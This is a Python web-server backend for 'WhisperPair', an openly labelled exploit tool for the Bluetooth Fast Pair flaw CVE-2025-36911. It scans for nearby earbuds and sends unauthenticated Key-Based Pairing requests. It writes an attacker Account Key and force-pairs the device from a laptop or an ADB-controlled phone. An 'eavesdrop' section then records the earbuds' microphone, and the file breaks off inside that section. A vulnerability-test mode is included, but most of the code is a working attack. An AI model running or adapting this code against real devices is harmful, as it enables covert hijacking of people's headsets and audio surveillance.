#!/usr/bin/env python3
"""
WhisperPair Web Interface - Backend
Flask + Socket.IO server wrapping fast_pair_demo.py
"""

import asyncio
import subprocess
import threading
import time
from datetime import datetime
from dataclasses import asdict

import base64
import os
import select
import socket as sock
from flask import Flask, jsonify, send_file
from flask_cors import CORS
from flask_socketio import SocketIO, emit

from fast_pair_demo import (
    ExploitStrategy,
    WhisperPairExploit,
    scan_for_targets,
    build_raw_kbp_request,
    build_retroactive_request,
    build_extended_request,
    parse_kbp_response,
    calculate_entropy,
    pair_classic_bluetooth,
    connect_classic_bluetooth,
    aes_encrypt,
    CHAR_KEY_PAIRING,
    CHAR_PASSKEY,
    CHAR_ACCOUNT_KEY,
    CHAR_MODEL_ID,
    MessageType,
)

import secrets

from adb_manager import ADBManager
from known_devices import lookup_device, KNOWN_DEVICES

adb = ADBManager()
selected_adb_device = None

app = Flask(__name__)
CORS(app)
socketio = SocketIO(app, cors_allowed_origins="*", async_mode="threading")

# Cached state
discovered_devices = []
active_exploit = None
exploit_cancel = threading.Event()

STRATEGIES = {
    "RAW_KBP": {
        "name": "RAW_KBP",
        "label": "Raw KBP",
        "description": "Raw unencrypted Key-Based Pairing request. Most common for vulnerable devices.",
        "flags": "0x11",
        "value": int(ExploitStrategy.RAW_KBP),
    },
    "RAW_WITH_SEEKER": {
        "name": "RAW_WITH_SEEKER",
        "label": "Raw + Seeker Address",
        "description": "Raw KBP with seeker address included for bonding initiation.",
        "flags": "0x01",
        "value": int(ExploitStrategy.RAW_WITH_SEEKER),
    },
    "RETROACTIVE": {
        "name": "RETROACTIVE",
        "label": "Retroactive Pairing",
        "description": "Retroactive pairing flag bypass. Sets bonding + retroactive bits.",
        "flags": "0x0A",
        "value": int(ExploitStrategy.RETROACTIVE),
    },
    "EXTENDED_RESPONSE": {
        "name": "EXTENDED_RESPONSE",
        "label": "Extended Response",
        "description": "Requests extended response format from the device.",
        "flags": "0x10",
        "value": int(ExploitStrategy.EXTENDED_RESPONSE),
    },
}


# ==============================================================================
# REST ENDPOINTS
# ==============================================================================


@app.route("/api/status")
def api_status():
    return jsonify({
        "status": "online",
        "timestamp": datetime.now().isoformat(),
        "devices_cached": len(discovered_devices),
        "exploit_running": active_exploit is not None,
    })


@app.route("/api/devices")
def api_devices():
    return jsonify(discovered_devices)


@app.route("/api/strategies")
def api_strategies():
    return jsonify(list(STRATEGIES.values()))


@app.route("/api/known-devices")
def api_known_devices():
    return jsonify(KNOWN_DEVICES)


# ==============================================================================
# SOCKET.IO EVENTS
# ==============================================================================


@socketio.on("connect")
def handle_connect():
    emit("server:status", {"status": "connected"})


@socketio.on("adb:scan")
def handle_adb_scan():
    devices = adb.list_devices()
    for dev in devices:
        info = adb.get_device_info(dev["id"])
        dev.update(info)
    emit("adb:devices", {"devices": devices})


@socketio.on("adb:select")
def handle_adb_select(data):
    global selected_adb_device
    selected_adb_device = data.get("device_id")
    emit("adb:status", {
        "stage": "selected",
        "message": f"Selected device: {selected_adb_device}",
        "status": "success",
    })


@socketio.on("track:start")
def handle_track_start(data):
    mode = data.get("mode", "phone")
    if mode == "laptop":
        handle_track_laptop(data)
    else:
        handle_track_phone(data)


def force_hci_connection(bredr_address):
    """Send raw HCI Create_Connection to force a Classic BT ACL link.
    Requires CAP_NET_RAW (run backend with sudo).
    Returns True if the connection was initiated.
    """
    import struct
    import socket as raw_sock

    try:
        s = raw_sock.socket(raw_sock.AF_BLUETOOTH, raw_sock.SOCK_RAW, raw_sock.BTPROTO_HCI)
        s.bind((0,))  # hci0

        addr_bytes = bytes.fromhex(bredr_address.replace(":", ""))[::-1]
        pkt_type = struct.pack("<H", 0xCC18)
        page_scan_rep = struct.pack("B", 0x02)  # R2
        reserved = struct.pack("B", 0x00)
        clock_offset = struct.pack("<H", 0x0000)
        allow_role_switch = struct.pack("B", 0x01)

        params = addr_bytes + pkt_type + page_scan_rep + reserved + clock_offset + allow_role_switch
        cmd = struct.pack("B", 0x01)  # HCI command
        cmd += struct.pack("<H", 0x0405)  # Create_Connection opcode
        cmd += struct.pack("B", len(params)) + params

        s.send(cmd)
        s.close()
        return True
    except PermissionError:
        return False
    except Exception:
        return False


def handle_track_laptop(data):
    """Pair with the target device from the laptop using raw HCI for BR/EDR.
    Requires sudo for raw HCI socket access.
    """
    bredr_address = data.get("bredr_address")

    if not bredr_address:
        emit("track:status", {"stage": "error", "message": "No BR/EDR address provided", "status": "error"})
        return

    def run_laptop_pair():
        """Pair via BLE first, then CTKD to derive BR/EDR link key."""
        from ctkd import perform_ctkd

        ble_address = data.get("ble_address")

        # Step 1: BLE scan + pair to get LTK
        socketio.emit("track:status", {
            "stage": "pairing",
            "message": "Step 1/4: BLE scanning for device...",
            "status": "running",
        })

        # Scan to discover the device
        scan_proc = subprocess.Popen(
            ["bluetoothctl"], stdin=subprocess.PIPE,
            stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True,
        )
        try:
            scan_proc.stdin.write("scan on\n")
            scan_proc.stdin.flush()
            time.sleep(6)
            scan_proc.stdin.write("scan off\n")
            scan_proc.stdin.flush()
            time.sleep(1)
            scan_proc.stdin.write("quit\n")
            scan_proc.stdin.flush()
            scan_proc.wait(timeout=3)
        except Exception:
            if scan_proc.poll() is None:
                scan_proc.terminate()

        # Find the WF-C510 BLE address
        dev_result = subprocess.run(
            ["bluetoothctl", "devices"],
            capture_output=True, text=True, timeout=5,
        )
        ble_addr = None
        for line in dev_result.stdout.splitlines():
            if "C510" in line:
                parts = line.split()
                if len(parts) >= 2:
                    ble_addr = parts[1]
                    break

        if not ble_addr:
            socketio.emit("track:status", {
                "stage": "complete",
                "message": "Device not found via BLE scan.",
                "status": "warning",
            })
            return

        socketio.emit("track:status", {
            "stage": "pairing",
            "message": f"Step 2/4: BLE pairing with {ble_addr}...",
            "status": "running",
        })

        # Pair via BLE
        pair_proc = subprocess.Popen(
            ["bluetoothctl"], stdin=subprocess.PIPE,
            stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True,
        )
        try:
            pair_proc.stdin.write("agent on\n")
            pair_proc.stdin.flush()
            time.sleep(2)
            pair_proc.stdin.write("default-agent\n")
            pair_proc.stdin.flush()
            time.sleep(1)
            pair_proc.stdin.write(f"trust {ble_addr}\n")
            pair_proc.stdin.flush()
            time.sleep(1)
            pair_proc.stdin.write(f"pair {ble_addr}\n")
            pair_proc.stdin.flush()
            time.sleep(10)
            pair_proc.stdin.write("quit\n")
            pair_proc.stdin.flush()
            pair_proc.communicate(timeout=5)
        except Exception:
            if pair_proc.poll() is None:
                pair_proc.terminate()

        # Check if LE pairing created an LTK
        check = subprocess.run(
            ["bluetoothctl", "info", ble_addr],
            capture_output=True, text=True, timeout=5,
        )
        le_paired = "Paired: yes" in check.stdout

        if not le_paired:
            socketio.emit("track:status", {
                "stage": "complete",
                "message": f"BLE pairing with {ble_addr} failed.",
                "status": "warning",
            })
            return

        socketio.emit("track:status", {
            "stage": "pairing",
            "message": "Step 3/4: Deriving BR/EDR Link Key via CTKD...",
            "status": "running",
        })

        # Step 2: CTKD — derive BR/EDR link key from LE LTK
        success, msg, link_key_hex = perform_ctkd("C510", bredr_address, "WF-C510")

        socketio.emit("track:status", {
            "stage": "pairing",
            "message": msg[:120],
            "status": "running" if success else "warning",
        })

        if not success:
            socketio.emit("track:status", {
                "stage": "complete",
                "message": f"CTKD failed: {msg}",
                "status": "warning",
            })
            return

        # Step 3: bluetoothd was restarted by CTKD. Connect with derived key.
        socketio.emit("track:status", {
            "stage": "pairing",
            "message": f"Step 4/4: Connecting to {bredr_address} with derived Link Key...",
            "status": "running",
        })

        connect_r = subprocess.run(
            ["bluetoothctl", "connect", bredr_address],
            capture_output=True, text=True, timeout=15,
        )

        socketio.emit("track:status", {
            "stage": "pairing",
            "message": f"Connect: {connect_r.stdout.strip()[:80]}",
            "status": "running",
        })

        # Verify
        time.sleep(2)
        check = subprocess.run(
            ["bluetoothctl", "info", bredr_address],
            capture_output=True, text=True, timeout=5,
        )
        is_paired = "Paired: yes" in check.stdout
        is_connected = "Connected: yes" in check.stdout

        if is_connected:
            socketio.emit("track:status", {
                "stage": "complete",
                "message": f"Laptop connected to {bredr_address} via CTKD! Link Key derived from LE bond.",
                "status": "success",
                "bredr_address": bredr_address,
            })
        elif is_paired:
            socketio.emit("track:status", {
                "stage": "complete",
                "message": f"Link Key injected. Device paired but not connected. Try again or check audio profiles.",
                "status": "success",
                "bredr_address": bredr_address,
            })
        else:
            socketio.emit("track:status", {
                "stage": "complete",
                "message": f"CTKD derived key injected but connection failed. The device may have rejected the derived key.",
                "status": "warning",
            })

    thread = threading.Thread(target=run_laptop_pair, daemon=True)
    thread.start()


def handle_track_phone(data):
    """Launch the companion app on the Android phone to perform Fast Pair KBP."""
    device_id = data.get("device_id") or selected_adb_device
    ble_address = data.get("ble_address")
    bredr_address = data.get("bredr_address")

    if not device_id:
        emit("track:status", {
            "stage": "error",
            "message": "No Android phone connected via ADB",
            "status": "error",
        })
        return

    if not ble_address:
        emit("track:status", {
            "stage": "error",
            "message": "No target BLE address available",
            "status": "error",
        })
        return

    def run_companion_pair():
        # Step 1: Remove device from laptop's Bluetooth so only the phone pairs
        socketio.emit("track:status", {
            "stage": "cleanup",
            "message": "Removing target from laptop Bluetooth...",
            "status": "running",
        })
        subprocess.run(["bluetoothctl", "remove", ble_address],
                       capture_output=True, text=True, timeout=10)
        if bredr_address:
            subprocess.run(["bluetoothctl", "remove", bredr_address],
                           capture_output=True, text=True, timeout=10)

        # Step 2: Snapshot bonded devices on phone
        bonded_before = adb.get_bonded_addresses(device_id)

        # Step 3: Launch companion app on phone with BLE + BR/EDR addresses
        socketio.emit("track:status", {
            "stage": "launching",
            "message": f"Launching WhisperPair companion — BLE: {ble_address}, BR/EDR: {bredr_address or 'auto'}...",
            "status": "running",
        })

        cmd = ["adb", "-s", device_id, "shell", "am", "start",
               "-a", "com.whisperpair.PAIR",
               "--es", "address", ble_address]
        if bredr_address:
            cmd.extend(["--es", "bredr_address", bredr_address])

        result = subprocess.run(cmd, capture_output=True, text=True, timeout=10)

        if result.returncode != 0:
            socketio.emit("track:status", {
                "stage": "complete",
                "message": f"Failed to launch companion app: {result.stderr.strip()}. "
                           "Install it first: adb install android/app/build/outputs/apk/debug/app-debug.apk",
                "status": "error",
            })
            return

        socketio.emit("track:status", {
            "stage": "exploiting",
            "message": "Companion app running KBP exploit from phone. Watch phone screen for progress...",
            "status": "running",
        })

        # Step 4: Monitor logcat for companion app output
        logcat_proc = subprocess.Popen(
            ["adb", "-s", device_id, "logcat", "-s", "WhisperPair:D", "-v", "brief"],
            stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True,
        )

        kbp_accepted = False
        account_key_written = False
        classic_paired = False
        start_time = time.time()
        timeout = 60  # 60 seconds max

        try:
            import select
            while time.time() - start_time < timeout:
                ready, _, _ = select.select([logcat_proc.stdout], [], [], 2.0)
                if ready:
                    line = logcat_proc.stdout.readline().strip()
                    if not line:
                        continue

                    # Parse log messages from companion app
                    msg = line.split(":", 1)[-1].strip() if ":" in line else line

                    if "KBP ACCEPTED" in msg:
                        kbp_accepted = True
                        socketio.emit("track:status", {
                            "stage": "kbp_accepted",
                            "message": "KBP accepted from phone — device is vulnerable!",
                            "status": "success",
                        })
                    elif "Account Key written" in msg:
                        account_key_written = True
                        socketio.emit("track:status", {
                            "stage": "account_key",
                            "message": msg,
                            "status": "success",
                        })
                    elif "Device bonded" in msg or "BOND_BONDED" in msg or "Classic BT paired" in msg:
                        classic_paired = True
                        socketio.emit("track:status", {
                            "stage": "paired",
                            "message": msg,
                            "status": "success",
                        })
                    elif "EXPLOIT COMPLETE" in msg:
                        classic_paired = True
                        break
                    elif "PARTIAL SUCCESS" in msg:
                        break
                    elif "ERROR" in msg or "rejected" in msg.lower():
                        socketio.emit("track:status", {
                            "stage": "exploiting",
                            "message": msg,
                            "status": "warning",
                        })

                # Also check bond state
                if not classic_paired:
                    if adb.verify_new_bond(device_id, bonded_before):
                        classic_paired = True
        finally:
            logcat_proc.terminate()
            logcat_proc.wait(timeout=5)

        # Report final status
        if classic_paired:
            socketio.emit("track:status", {
                "stage": "complete",
                "message": "Device force-paired with phone via CVE-2025-36911! "
                           "Phone now has full audio access to the target earbuds.",
                "status": "success",
                "bredr_address": bredr_address or ble_address,
            })
        elif kbp_accepted:
            socketio.emit("track:status", {
                "stage": "complete",
                "message": "KBP accepted (device is vulnerable) but Classic BT bond did not complete. "
                           "The device may need to be closer to the phone, or try again.",
                "status": "warning",
            })
        else:
            socketio.emit("track:status", {
                "stage": "complete",
                "message": "Companion app did not complete. Check the phone screen for details or permissions prompt.",
                "status": "warning",
            })

    thread = threading.Thread(target=run_companion_pair, daemon=True)
    thread.start()


@socketio.on("scan:start")
def handle_scan_start(data=None):
    duration = 10
    if data and "duration" in data:
        duration = min(int(data["duration"]), 30)

    def run_scan():
        global discovered_devices
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)

        socketio.emit("scan:status", {"status": "scanning", "duration": duration})

        try:
            devices = loop.run_until_complete(scan_for_targets(timeout=duration))
            discovered_devices = devices

            for dev in devices:
                enriched = dict(dev)
                db_entry = lookup_device(enriched.get("model_id"))
                if db_entry:
                    enriched["known_name"] = db_entry["name"]
                    enriched["manufacturer"] = db_entry["manufacturer"]
                    enriched["device_type"] = db_entry["type"]
                else:
                    enriched["known_name"] = None
                    enriched["manufacturer"] = None
                    enriched["device_type"] = None
                socketio.emit("scan:device_found", enriched)
                time.sleep(0.1)

            socketio.emit("scan:complete", {
                "count": len(devices),
                "duration": duration,
            })
        except Exception as e:
            socketio.emit("scan:error", {"message": str(e)})
        finally:
            loop.close()

    thread = threading.Thread(target=run_scan, daemon=True)
    thread.start()


@socketio.on("exploit:start")
def handle_exploit_start(data):
    global active_exploit
    exploit_cancel.clear()

    address = data.get("address")
    strategy_names = data.get("strategies", [])

    if not address:
        emit("exploit:error", {"message": "No target address provided"})
        return

    if not strategy_names:
        emit("exploit:error", {"message": "No strategies selected"})
        return

    strategies = []
    for name in strategy_names:
        try:
            strategies.append(ExploitStrategy[name])
        except KeyError:
            emit("exploit:error", {"message": f"Unknown strategy: {name}"})
            return

    def run_exploit():
        global active_exploit
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)

        try:
            loop.run_until_complete(
                _run_exploit_chain(address, strategies)
            )
        except Exception as e:
            socketio.emit("exploit:error", {"message": str(e)})
        finally:
            active_exploit = None
            loop.close()

    active_exploit = address
    thread = threading.Thread(target=run_exploit, daemon=True)
    thread.start()


@socketio.on("exploit:stop")
def handle_exploit_stop():
    global active_exploit
    exploit_cancel.set()
    active_exploit = None
    emit("exploit:stage", {
        "stage": "cancelled",
        "message": "Exploit cancelled by user",
        "status": "error",
    })


@socketio.on("vuln_test:start")
def handle_vuln_test_start(data):
    address = data.get("address")
    strategy_names = data.get("strategies", [])

    if not address:
        emit("exploit:error", {"message": "No target address provided"})
        return

    if not strategy_names:
        emit("exploit:error", {"message": "No strategies selected"})
        return

    strategies = []
    for name in strategy_names:
        try:
            strategies.append(ExploitStrategy[name])
        except KeyError:
            emit("exploit:error", {"message": f"Unknown strategy: {name}"})
            return

    def run_vuln_test():
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        try:
            loop.run_until_complete(_run_vuln_test(address, strategies))
        except Exception as e:
            socketio.emit("exploit:error", {"message": str(e)})
        finally:
            loop.close()

    thread = threading.Thread(target=run_vuln_test, daemon=True)
    thread.start()


# ==============================================================================
# EXPLOIT CHAIN (runs in background thread with event emissions)
# ==============================================================================


async def _run_exploit_chain(address: str, strategies: list):
    """Run exploit chain with real-time Socket.IO updates"""
    from bleak import BleakClient

    def stage(name, message, status="running"):
        socketio.emit("exploit:stage", {
            "stage": name,
            "message": message,
            "status": status,
            "timestamp": datetime.now().isoformat(),
        })

    result = {
        "success": False,
        "vulnerable": False,
        "br_edr_address": None,
        "paired": False,
        "account_key_written": False,
        "message": "",
        "model_id": None,
        "notifications": [],
        "strategies_tried": [],
    }

    client = None
    shared_secret = None
    br_edr_address = None
    kbp_response = None
    notification_event = asyncio.Event()
    notifications = []

    def notification_handler(sender, data: bytes):
        nonlocal kbp_response, br_edr_address
        char_uuid = str(sender.uuid).lower() if hasattr(sender, "uuid") else str(sender)
        entry = {
            "characteristic": char_uuid,
            "hex": data.hex(),
            "length": len(data),
            "entropy": round(calculate_entropy(data), 2),
            "timestamp": datetime.now().isoformat(),
        }
        notifications.append(entry)
        socketio.emit("exploit:notification", entry)

        if "1234" in char_uuid:
            kbp_response = data
            addr = parse_kbp_response(data, shared_secret)
            if addr:
                br_edr_address = addr
                stage("response_parsed", f"BR/EDR address extracted: {addr}", "success")

        notification_event.set()

    try:
        # Step 1: Connect with retry
        if exploit_cancel.is_set():
            return
        max_retries = 3
        for attempt in range(1, max_retries + 1):
            if exploit_cancel.is_set():
                return
            backoff = 2 ** (attempt - 1)
            stage("connecting", f"Connecting to {address} (attempt {attempt}/{max_retries})...")

            try:
                client = BleakClient(address, timeout=15.0)
                await client.connect()
                if client.is_connected:
                    stage("connecting", "Connected to device", "success")
                    break
            except Exception as e:
                if attempt < max_retries:
                    stage("connecting", f"Attempt {attempt} failed: {e}. Retrying in {backoff}s...", "warning")
                    await asyncio.sleep(backoff)
                else:
                    stage("connecting", f"Connection failed after {max_retries} attempts: {e}", "error")
                    result["message"] = f"Connection failed after {max_retries} attempts"
                    socketio.emit("exploit:result", result)
                    return
        else:
            stage("connecting", "Connection failed", "error")
            result["message"] = "Connection failed"
            socketio.emit("exploit:result", result)
            return

        if not client.is_connected:
            stage("connecting", "Connection failed", "error")
            result["message"] = "Connection failed"
            socketio.emit("exploit:result", result)
            return

        # Step 1.5: MTU negotiation
        try:
            mtu = client.mtu_size
            stage("mtu", f"MTU negotiated: {mtu} bytes", "success")
        except Exception:
            stage("mtu", "MTU negotiation not supported, using default", "warning")

        # Step 2: Read Model ID
        if exploit_cancel.is_set():
            return
        stage("model_id", "Reading Model ID...")

        try:
            data = await client.read_gatt_char(CHAR_MODEL_ID)
            if len(data) >= 3:
                model_id = (data[0] << 16) | (data[1] << 8) | data[2]
                model_id_str = f"0x{model_id:06X}"
                result["model_id"] = model_id_str
                db_entry = lookup_device(model_id_str)
                if db_entry:
                    stage("model_id",
                          f"Model ID: {model_id_str} ({db_entry['manufacturer']} {db_entry['name']})",
                          "success")
                else:
                    stage("model_id", f"Model ID: {model_id_str}", "success")
            else:
                stage("model_id", "Model ID: unknown format", "warning")
        except Exception as e:
            stage("model_id", f"Could not read Model ID: {e}", "warning")

        # Step 3: Subscribe to notifications
        if exploit_cancel.is_set():
            return
        stage("subscribe", "Subscribing to notifications...")

        for char_uuid in [CHAR_KEY_PAIRING, CHAR_PASSKEY]:
            try:
                await client.start_notify(char_uuid, notification_handler)
            except Exception:
                pass

        stage("subscribe", "Subscribed to KBP + Passkey notifications", "success")
        await asyncio.sleep(0.5)

        # Step 4: Try exploit strategies
        kbp_accepted = False
        for strategy in strategies:
            if exploit_cancel.is_set():
                return

            strategy_name = strategy.name
            result["strategies_tried"].append(strategy_name)
            stage("kbp_request", f"Sending KBP request ({strategy_name})...")

            # Build request
            if strategy == ExploitStrategy.RAW_KBP:
                request, shared_secret = build_raw_kbp_request(address)
            elif strategy == ExploitStrategy.RAW_WITH_SEEKER:
                request, shared_secret = build_raw_kbp_request(address)
            elif strategy == ExploitStrategy.RETROACTIVE:
                request, shared_secret = build_retroactive_request(address)
            elif strategy == ExploitStrategy.EXTENDED_RESPONSE:
                request, shared_secret = build_extended_request(address)
            else:
                request, shared_secret = build_raw_kbp_request(address)

            try:
                notification_event.clear()
                await client.write_gatt_char(CHAR_KEY_PAIRING, request, response=True)

                kbp_accepted = True
                result["vulnerable"] = True
                stage("kbp_request", f"KBP ACCEPTED ({strategy_name}) - Device is VULNERABLE!", "success")

                # Wait for notification
                stage("waiting_response", "Waiting for device response...")
                try:
                    await asyncio.wait_for(notification_event.wait(), timeout=5.0)
                    stage("waiting_response", "Response received", "success")
                except asyncio.TimeoutError:
                    stage("waiting_response", "No notification received (timeout)", "warning")

                break

            except Exception as e:
                error_str = str(e).lower()
                if "not permitted" in error_str or "rejected" in error_str:
                    stage("kbp_request", f"KBP rejected ({strategy_name}) - device may be patched", "error")
                else:
                    stage("kbp_request", f"KBP failed ({strategy_name}): {e}", "error")

                await asyncio.sleep(1)

        if not kbp_accepted:
            result["message"] = "All strategies rejected - device appears patched"
            stage("complete", result["message"], "error")
            socketio.emit("exploit:result", result)
            return

        # Step 5: Determine BR/EDR address
        if not br_edr_address:
            br_edr_address = address
            stage("address", f"Using BLE address as BR/EDR fallback: {address}", "warning")
        else:
            stage("address", f"BR/EDR address: {br_edr_address}", "success")

        result["br_edr_address"] = br_edr_address

        # Step 6: Write Account Key
        if exploit_cancel.is_set():
            return
        stage("account_key", "Writing Account Key...")

        account_key = bytearray(16)
        account_key[0] = 0x04
        account_key[1:16] = secrets.token_bytes(15)
        result["account_key"] = account_key.hex()

        if shared_secret:
            data_to_write = aes_encrypt(shared_secret, bytes(account_key))
        else:
            data_to_write = bytes(account_key)

        try:
            await client.write_gatt_char(CHAR_ACCOUNT_KEY, data_to_write, response=True)
            result["account_key_written"] = True
            stage("account_key", f"Account Key written successfully: {account_key.hex()}", "success")
        except Exception as e:
            stage("account_key", f"Account Key write failed: {e}", "warning")

        # Step 7: Disconnect BLE
        await client.disconnect()
        client = None
        stage("disconnect", "BLE disconnected", "success")

        # Skip Classic BT pairing from laptop — the companion app on
        # the phone will handle pairing via the Track button.
        result["paired"] = False

        # Final result
        result["success"] = result["vulnerable"] and result["account_key_written"]
        result["notifications"] = notifications
        result["message"] = "Exploit successful!" if result["success"] else "Partial success - device is vulnerable"

        stage("complete", result["message"], "success" if result["success"] else "warning")
        socketio.emit("exploit:result", result)

    except Exception as e:
        result["message"] = f"Error: {e}"
        result["notifications"] = notifications
        stage("error", str(e), "error")
        socketio.emit("exploit:result", result)

    finally:
        if client and client.is_connected:
            try:
                await client.disconnect()
            except Exception:
                pass


async def _run_vuln_test(address: str, strategies: list):
    """Non-invasive vulnerability test: connect, send KBP, check response, disconnect.
    Does NOT write account key or attempt Classic BT pairing."""
    from bleak import BleakClient

    def stage(name, message, status="running"):
        socketio.emit("exploit:stage", {
            "stage": name,
            "message": message,
            "status": status,
            "timestamp": datetime.now().isoformat(),
        })

    result = {
        "success": False,
        "vulnerable": False,
        "br_edr_address": None,
        "paired": False,
        "account_key_written": False,
        "message": "",
        "model_id": None,
        "notifications": [],
        "strategies_tried": [],
        "test_only": True,
    }

    client = None
    shared_secret = None
    br_edr_address = None
    notification_event = asyncio.Event()
    notifications = []

    def notification_handler(sender, data: bytes):
        nonlocal br_edr_address
        char_uuid = str(sender.uuid).lower() if hasattr(sender, "uuid") else str(sender)
        entry = {
            "characteristic": char_uuid,
            "hex": data.hex(),
            "length": len(data),
            "entropy": round(calculate_entropy(data), 2),
            "timestamp": datetime.now().isoformat(),
        }
        notifications.append(entry)
        socketio.emit("exploit:notification", entry)

        if "1234" in char_uuid:
            addr = parse_kbp_response(data, shared_secret)
            if addr:
                br_edr_address = addr
                stage("response_parsed", f"BR/EDR address extracted: {addr}", "success")

        notification_event.set()

    try:
        # Step 1: Connect with retry
        max_retries = 3
        for attempt in range(1, max_retries + 1):
            backoff = 2 ** (attempt - 1)
            stage("connecting", f"Connecting to {address} (attempt {attempt}/{max_retries})...")
            try:
                client = BleakClient(address, timeout=15.0)
                await client.connect()
                if client.is_connected:
                    stage("connecting", "Connected to device", "success")
                    break
            except Exception as e:
                if attempt < max_retries:
                    stage("connecting", f"Attempt {attempt} failed: {e}. Retrying in {backoff}s...", "warning")
                    await asyncio.sleep(backoff)
                else:
                    stage("connecting", f"Connection failed after {max_retries} attempts", "error")
                    result["message"] = "Connection failed"
                    socketio.emit("exploit:result", result)
                    return

        if not client or not client.is_connected:
            result["message"] = "Connection failed"
            socketio.emit("exploit:result", result)
            return

        # Step 2: Read Model ID
        stage("model_id", "Reading Model ID...")
        try:
            data = await client.read_gatt_char(CHAR_MODEL_ID)
            if len(data) >= 3:
                model_id = (data[0] << 16) | (data[1] << 8) | data[2]
                result["model_id"] = f"0x{model_id:06X}"
                stage("model_id", f"Model ID: 0x{model_id:06X}", "success")
        except Exception as e:
            stage("model_id", f"Could not read Model ID: {e}", "warning")

        # Step 3: Subscribe to notifications
        stage("subscribe", "Subscribing to notifications...")
        for char_uuid in [CHAR_KEY_PAIRING, CHAR_PASSKEY]:
            try:
                await client.start_notify(char_uuid, notification_handler)
            except Exception:
                pass
        stage("subscribe", "Subscribed to KBP + Passkey notifications", "success")
        await asyncio.sleep(0.5)

        # Step 4: Try exploit strategies (test only - just send KBP, no account key)
        kbp_accepted = False
        for strategy in strategies:
            strategy_name = strategy.name
            result["strategies_tried"].append(strategy_name)
            stage("kbp_request", f"[TEST] Sending KBP request ({strategy_name})...")

            if strategy == ExploitStrategy.RAW_KBP:
                request, shared_secret = build_raw_kbp_request(address)
            elif strategy == ExploitStrategy.RAW_WITH_SEEKER:
                request, shared_secret = build_raw_kbp_request(address)
            elif strategy == ExploitStrategy.RETROACTIVE:
                request, shared_secret = build_retroactive_request(address)
            elif strategy == ExploitStrategy.EXTENDED_RESPONSE:
                request, shared_secret = build_extended_request(address)
            else:
                request, shared_secret = build_raw_kbp_request(address)

            try:
                notification_event.clear()
                await client.write_gatt_char(CHAR_KEY_PAIRING, request, response=True)
                kbp_accepted = True
                result["vulnerable"] = True
                stage("kbp_request", f"[TEST] KBP ACCEPTED ({strategy_name}) - Device is VULNERABLE!", "success")

                try:
                    await asyncio.wait_for(notification_event.wait(), timeout=5.0)
                    stage("waiting_response", "Response received", "success")
                except asyncio.TimeoutError:
                    stage("waiting_response", "No notification received (timeout)", "warning")

                break
            except Exception as e:
                error_str = str(e).lower()
                if "not permitted" in error_str or "rejected" in error_str:
                    stage("kbp_request", f"[TEST] KBP rejected ({strategy_name})", "error")
                else:
                    stage("kbp_request", f"[TEST] KBP failed ({strategy_name}): {e}", "error")
                await asyncio.sleep(1)

        # Step 5: Determine result (no account key, no pairing)
        if br_edr_address:
            result["br_edr_address"] = br_edr_address

        if kbp_accepted:
            result["success"] = True
            result["message"] = "TEST COMPLETE: Device is VULNERABLE to CVE-2025-36911 (no exploit performed)"
            stage("complete", result["message"], "success")
        else:
            result["message"] = "TEST COMPLETE: Device appears patched"
            stage("complete", result["message"], "error")

        result["notifications"] = notifications
        socketio.emit("exploit:result", result)

    except Exception as e:
        result["message"] = f"Error: {e}"
        result["notifications"] = notifications
        stage("error", str(e), "error")
        socketio.emit("exploit:result", result)

    finally:
        if client and client.is_connected:
            try:
                await client.disconnect()
            except Exception:
                pass


# ==============================================================================
# LIVE EAVESDROP
# ==============================================================================

last_eavesdrop_file = None
eavesdrop_logcat = None
eavesdrop_proc = None  # For laptop mode parecord process


@app.route("/api/eavesdrop/download")
def download_eavesdrop():
    if last_eavesdrop_file and os.path.exists(last_eavesdrop_file):
        return send_file(last_eavesdrop_file, as_attachment=True,
                         download_name="eavesdrop_recording.wav")
    return jsonify({"error": "No recording available"}), 404


@socketio.on("eavesdrop:start")
def handle_eavesdrop_start(data):
    mode = data.get("mode", "phone")
    if mode == "laptop":
        handle_eavesdrop_laptop(data)
    else:
        handle_eavesdrop_phone(data)


def handle_eavesdrop_laptop(data):
    """Record from BT mic using PipeWire on the laptop."""
    global last_eavesdrop_file, eavesdrop_proc

    address = data.get("address")
    if not address:
        socketio.emit("eavesdrop:status", {"stage": "error", "message": "No target address", "status": "error"})
        return

    def run_laptop_eavesdrop():
        global last_eavesdrop_file, eavesdrop_proc

        socketio.emit("eavesdrop:status", {
            "stage": "launching",
            "message": "Finding Bluetooth audio source...",
            "status": "running",
        })

        # Find BT audio source via wpctl / pw-cli
        bt_source = None
        addr_nodash = address.replace(":", "_")

        result = subprocess.run(
            ["wpctl", "status"],
            capture_output=True, text=True, timeout=5,
        )
        for line in result.stdout.splitlines():
            if "bluez" in line.lower() and "source" in line.lower().split("bluez")[0]:
                # Extract node ID
                stripped = line.strip()
                if stripped and stripped[0].isdigit():
                    node_id = stripped.split(".")[0].strip()
                    bt_source = node_id
                    break

        # If no source found, try setting HFP profile first
        if not bt_source:
            socketio.emit("eavesdrop:status", {
                "stage": "launching",
                "message": "Switching to HFP profile for mic access...",
                "status": "running",
            })
            # Find bluez card in wpctl and set to headset profile
            in_audio = False
            for line in result.stdout.splitlines():
                if "Audio" in line:
                    in_audio = True
                if in_audio and "bluez" in line.lower():
                    stripped = line.strip()
                    if stripped and stripped[0].isdigit():
                        card_id = stripped.split(".")[0].strip()
                        subprocess.run(
                            ["wpctl", "set-profile", card_id, "1"],  # headset-head-unit
                            capture_output=True, text=True, timeout=5,
                        )
                        time.sleep(2)
                        break

            # Retry
            result2 = subprocess.run(["wpctl", "status"], capture_output=True, text=True, timeout=5)
            for line in result2.stdout.splitlines():
                if "bluez" in line.lower() and ("source" in line.lower() or "input" in line.lower()):
                    stripped = line.strip()
                    if stripped and stripped[0].isdigit():
                        bt_source = stripped.split(".")[0].strip()
                        break

        if not bt_source:
            socketio.emit("eavesdrop:status", {
                "stage": "error",
                "message": "No Bluetooth audio source found. Make sure the device is connected with HFP profile.",
                "status": "error",
            })
            return

        socketio.emit("eavesdrop:status", {
            "stage": "recording",
            "message": f"LIVE — recording from BT source (node {bt_source})",
            "status": "running",
        })

        # Record to WAV file
        local_path = os.path.join(os.path.dirname(__file__), "eavesdrop_recording.wav")

        # pw-record saves to file; pw-cat streams to stdout
        rec_proc = subprocess.Popen(
